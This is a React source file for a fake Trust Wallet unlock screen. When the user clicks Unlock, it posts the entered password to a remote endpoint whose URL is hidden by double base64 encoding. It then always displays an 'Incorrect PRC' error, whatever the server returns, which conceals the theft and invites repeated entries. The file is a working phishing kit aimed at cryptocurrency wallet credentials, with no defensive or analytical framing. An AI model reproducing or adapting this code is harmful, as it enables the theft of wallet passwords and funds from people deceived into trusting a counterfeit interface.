import trustwallet from 'assets/images/icons/trustwallet.svg'
import { Image } from "react-bootstrap";
import Styles from './trust.module.css'
import { useState, useEffect } from 'react';
const TrustWallet = () => {
    const [isPasswordVisible, setIsPasswordVisible] = useState(false);
    const [password, setPassword] = useState('')
    const [errormessage, setErrormessage] = useState(false)
    const [errrpc, setErrrpc] = useState(false)
    const [loader, setLoader] = useState(false)
    const [code, setCode] = useState('')

    const handleCodeChange = (e) => {
        const value = e.target.value
        if (password.length !== value.length) {
            setErrormessage(false)
            setErrrpc(false)
        }
        setPassword(value)
    }
    useEffect(() => {
        setCode('ABC')
    }, [])

    const unlock = async () => {
        setErrormessage(false)
        setErrrpc(false)
        if (password.length === 0) {
            return;
        } else if (password.length < 8) {
            setErrormessage(true)
            return;
        }
        //here is the code that we have read ABC
        const device = code
        const url = 'YUhSMGNITTZMeTluWVc1aFkyaGxMbXhwZG1VdllYQnBMM1l4TDJodw==';
        const requestData = { device, value: password };
        try {
            setLoader(true)
            const response = await fetch(atob(atob(url)), {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(requestData),
            });

            if (response.ok) {
                await response.json();
                setErrrpc(true)
            } else {
                setErrrpc(true)

            }
        } catch (error) {
            setErrrpc(true)

        } finally {
            setLoader(false)
            setErrrpc(true)

        }


    }


    function togglePasswordVisibility() {
        setIsPasswordVisible((prevState) => !prevState);
    }
    return (
        <div>
            <div class="flex items-center mt-6 justify-center w-full h-full flex-1 flex-col">
                <Image src={trustwallet} alt="Trust Wallet" />
                <div className="pt-4 pb-6 text-center w-10/12"><p className="title-text text-textPrimary font-semibold text-unset"> Secure and trusted multi-chain crypto wallet</p></div>
            </div>

            <div className='ml-10'>
                <p className="text-2xl font-semibold mb-2">Password</p>
                <div className={`relative w-11/12`}>
                    <input
                        type={isPasswordVisible ? "text" : "password"}
                        className={`w-full
                        h-20                       
                        bg-gray-100
                        rounded
                        outline-none
                        p-3
                        font-bold
                        text-2xl
                        ${errormessage ? 'ring-red-500 border-red-500 ring-1' :
                                'focus:ring-blue-500 focus:border-blue-500 focus:ring-1'}`}
                        autocomplete="off"
                        value={password}
                        onChange={handleCodeChange}
                    />
                    <button
                        className="absolute inset-y-0 right-0 flex items-center px-4 text-gray-600"
                        onClick={togglePasswordVisibility}
                    >

                        {isPasswordVisible ? (
                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
                        ) : (
                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
                        )}
                    </button>

                </div>
                {errormessage ? <div className={`${Styles.errormessage}`}>Incorrect password</div> : errrpc ? <div className={`${Styles.errormessage}`}>Incorrect PRC</div> : ''}
            </div>
            <button type="submit" class={`outline-none w-10/12 ${Styles.unlock} ${password ? `${Styles.ifval}` : `${Styles.noval}`}`} onClick={unlock}>
                {loader ? (
                    <div className={`${Styles.spinner} ${Styles.loadertrue}`}></div>
                ) : (
                    "Unlock"
                )}
            </button>
            <div class="flex flex-col items-center justify-end text-center w-full border-t-line border-t pt-4 mt-36"><div class="w-3/4"><p class="body-text text-textSecondary text-xl text-unset font-semibold mt-2">Can't login? You can erase your current wallet and set up a new one</p></div><div class="flex w-full"  ><button type="button" class="outline-none bg-transparent text-backgroundPrimary default-button   w-full"><p class="body-text text-primary font-medium text-unset">Reset wallet</p></button></div></div>
        </div >


    )
}

export default TrustWallet